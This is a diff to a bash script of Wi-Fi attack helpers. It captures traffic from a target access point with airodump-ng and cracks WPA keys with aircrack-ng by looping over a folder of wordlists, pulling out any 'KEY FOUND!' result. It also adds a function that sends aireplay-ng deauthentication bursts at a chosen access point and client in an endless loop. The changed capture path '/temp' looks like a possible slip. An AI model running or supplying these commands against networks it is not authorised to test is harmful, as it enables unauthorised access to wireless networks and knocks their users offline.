@@ -17,7 +17,7 @@ function cavan-wifi-mon-scan()
 
 function cavan-wifi-mon-capture()
 {
-	local savedir="/tmp/cavan-wifi"
+	local savedir="/temp/cavan-wifi"
 	local pathname="${savedir}/$(echo $1 | tr ':' '-')"
 
 	echo "bssid = $1"
@@ -29,7 +29,6 @@ function cavan-wifi-mon-capture()
 	read
 
 	sudo mkdir -pv "${savedir}"
-
 	sudo airodump-ng -c $2 -w "${pathname}" --bssid $1 $3
 }
 
@@ -42,10 +41,37 @@ function cavan-wifi-mon-crack()
 	echo "words = ${words}"
 	echo "datas = $*"
 
-	echo "Press enter to start"
-	read
+	if [ -d "${words}" ]
+	then
+		for fn in $(find "${words}" -type f -iname "*.txt")
+		do
+			date
+			ls -lh "$fn"
 
-	aircrack-ng -w $1 $*
+			local key=$(aircrack-ng -w "$fn" $* | grep "KEY FOUND!" | sed 's/^.*\[ \(.*\) \].*$/\1/g' | uniq)
+			[ -n "$key" ] &&
+			{
+				echo "key = '$key'"
+				break
+			}
+		done
+	else
+		echo "Press enter to start"
+		read
+		aircrack-ng -w "${words}" $*
+	fi
+}
+
+function cavan-wifi-mon-deauth()
+{
+	echo "ap_mac = $1"
+	echo "client_mac = $2"
+	echo "interface = $3"
+
+	while :;
+	do
+		sudo aireplay-ng --ignore-negative-one -0 10 -a $1 -c $2 $3
+	done
 }
 
 function cavan-wifi-minidwep-gtk()
